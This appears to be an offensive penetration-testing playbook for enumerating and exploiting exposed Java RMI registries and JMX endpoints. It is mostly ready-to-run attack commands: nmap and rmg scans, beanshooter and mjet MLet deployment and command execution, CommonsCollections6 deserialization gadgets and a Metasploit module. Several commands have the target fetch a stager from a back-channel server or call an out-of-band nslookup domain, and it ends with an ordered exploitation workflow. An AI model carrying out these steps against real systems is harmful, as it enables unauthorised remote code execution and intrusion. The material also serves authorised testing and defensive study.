# Java RMI / JMX enumeration and RCE — Open WHEN: recon finds a Java RMI registry, a `jmxrmi` bound name, or a port that nmap fingerprints as `java-rmi` / `java-object` and you need the enumerate-then-exploit flow

Java RMI lets one JVM invoke methods on objects in another JVM. A poorly
configured RMI registry or an exposed JMX service is a deserialization sink:
every remote call ships serialized arguments, and many registries still allow
loading classes from a remote URL. Default ports: registry `1099`, often also
`1090`/`9010`/`jmxrmi`. The flow is always **enumerate → identify sink →
deliver a gadget that matches the bundled libs**.

## Detection with nmap (installed tool)
```bash
# Fingerprint the service and run the two RMI NSE scripts
nmap -sV -Pn -p <PORT> --script "rmi-dumpregistry or rmi-vuln-classloader" <IP>
```
A positive `rmi-vuln-classloader` means the registry will load classes from a
remote URL → remote code execution. `rmi-dumpregistry` prints the bound names;
`jmxrmi` / `RMIServerImpl_Stub` in the output means a JMX management endpoint is
exposed and is the highest-value target.

Sweep a wide port range for any RMI service when the port is unknown:
```bash
nmap -sV -Pn -p 0-65535 --open --script rmi-dumpregistry <IP>     # slow but thorough
```

## Enumerate with remote-method-guesser (rmg)
`rmg` is the current best RMI scanner — it enumerates bound names, classes, and
the set of known weaknesses in one pass.
```bash
rmg scan <IP> --ports 0-65535          # find every RMI service (Registry/DGC/Activator)
rmg enum <IP> <PORT>                   # list bound names + their interface classes + ObjID
```
Bound names whose class is `(unknown class)` are remote interfaces you may be
able to call. Watch the enum output for the registry/DGC weaknesses rmg flags
(remote class loading, codebase enabled, `enableClass` available).

## JMX RCE via MLet (getMBeansFromURL) — when JMX auth is OFF
The classic JMX takeover: create an `MLet` MBean on the target, point it at a
back-channel HTTP server hosting an MLet descriptor + a JAR with a custom MBean,
then invoke the malicious MBean. Tools automate every step.

beanshooter (qtc-de) — modern, no Jython needed:
```bash
beanshooter enum <IP> <PORT>                       # is JMX reachable, auth on/off
beanshooter brute <IP> <PORT>                      # password-protected JMX
beanshooter standard <IP> <PORT> exec 'id'         # run a command via a standard MBean
beanshooter deploy <IP> <PORT> non.existing.Bean qtc.test:type=Example \
  --jar-file exampleBean.jar --stager-url http://<BACKCHANNEL_IP>:8000
# Deserialization gadget straight at the JMX endpoint (gadget must match bundled libs):
beanshooter serial <IP> <PORT> CommonsCollections6 "nslookup $RAND.oast.live" \
  --username admin --password admin
```
sjet / mjet (Jython) — older but works when JMX auth is disabled and the target
can reach your HTTP server:
```bash
jython mjet.py <IP> <PORT> install super_secret http://<BACKCHANNEL_IP>:8000 8000
jython mjet.py <IP> <PORT> command super_secret "whoami"
jython mjet.py --jmxrole admin --jmxpassword adminpassword <IP> <PORT> \
  deserialize CommonsCollections6 "touch /tmp/x"     # gadget path when auth IS set
```

## RMI registry RCE via remote class loading
When `rmi-vuln-classloader` reports VULNERABLE, the registry will fetch and load
a class from a URL you control. Stand up a class-hosting HTTP server (see the
marshalsec section in `payloads-java-dotnet.md`) and let the registry pull your
class. Metasploit automates the codebase trick:
```bash
# msfconsole
use exploit/multi/misc/java_rmi_server      # set RHOSTS / RPORT, run
use auxiliary/scanner/misc/java_rmi_server   # detection-only variant
```

## Order of operations
1. `nmap --script rmi-dumpregistry,rmi-vuln-classloader` → is it RMI, is the
   classloader open, is `jmxrmi` bound?
2. `rmg enum` → exact bound names, interface classes, and flagged weaknesses.
3. If JMX (`jmxrmi`): try `beanshooter enum`; if auth off, MLet/standard-MBean
   RCE; if auth on, brute then `serial` with a lib-matched gadget.
4. If a plain registry with classloader open: remote class-loading RCE.
5. Quiet first: a `nslookup $RAND.oast.live` command through any of these proves
   execution before you ever spawn a back-channel shell.
```
